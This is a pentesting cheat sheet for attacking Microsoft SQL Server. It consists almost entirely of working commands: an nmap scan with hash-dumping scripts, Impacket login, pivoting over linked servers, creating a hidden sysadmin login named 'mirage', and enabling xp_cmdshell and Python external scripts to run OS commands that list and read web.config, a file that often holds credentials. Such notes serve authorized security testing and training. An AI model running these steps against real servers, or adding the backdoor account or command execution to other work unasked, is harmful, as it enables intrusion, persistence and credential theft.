# MSSQL: Port 1443

1. Perform a quick nmap scan

        nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>

2. Connect to MSSQL server using [Impacket](../../Network/Network/impacket_tools/README.md)'s `mssqlclient.py` tool (when database credentials are known)

        $ ./examples/mssqlclient.py username@10.12.13.4

3. Once connected, try following commands

        SQL> select suser_name()
        SQL> select name,sysadmin from syslogins
        SQL> select srvname,isremote from sysservers
        SQL> select name from sysdatabases

    Identify any linked server

4. Execute queries on a **linked server**, if one exists

        SQL> exec('select current_user') at [LinkedServer\ServerName];
        SQL> exec('select name,sysadmin from syslogins') at [LinkedServer\ServerName];
        SQL> exec('select srvname,isremote from sysservers') at [LinkedServer\ServerName];
        SQL> exec('exec(''select suser_name()'') at [NestedLinkedServer\NestedServerName]') at [LinkedServer\ServerName]

5. Sysadmin-level users can enable and execute system commands using the `xp_cmdshell` stored procedure. 
   1. Add a **new SQL user**.

            exec sp_addlogin 'mirage','Password123'

   2. Give **sysadmin** privileges to the user

            exec sp_addsrvrolemember 'mirage','sysadmin'

   3. Connect to MSSQL server as a sysadmin

            mssqlclient.py mirage@10.12.13.4

   4. Enable `xp_cmdshell` with `sp_configure`
            
            SQL> sp_configure 'show advanced options', '1'
            SQL> RECONFIGURE
            SQL> sp_configure 'xp_cmdshell', '1' 
            SQL> RECONFIGURE

   5. Execute commands

            SQL> xp_cmdshell whoami
            SQL> xp_cmdshell "dir c:\"
            SQL> xp_cmdshell icacls C:\inetpub\wwwroot\web.config

   6. Execute **externals scripts** written in R or Python

            SQL> sp_configure 'external scripts enabled',1
            SQL> RECONFIGURE
            SQL> sp_execute_external_script @language = N'Python', @script = N'print("Hello world!");';
            SQL> sp_execute_external_script @language = N'Python', @script = N'import os; os.system(''dir C:\\inetpub\\wwwroot'')';
            SQL> sp_execute_external_script @language = N'Python', @script = N'import os; os.system(''type C:\\inetpub\\wwwroot\\web.config'')';

## Resources

* https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
* https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
* https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/
* https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql?view=sql-server-ver15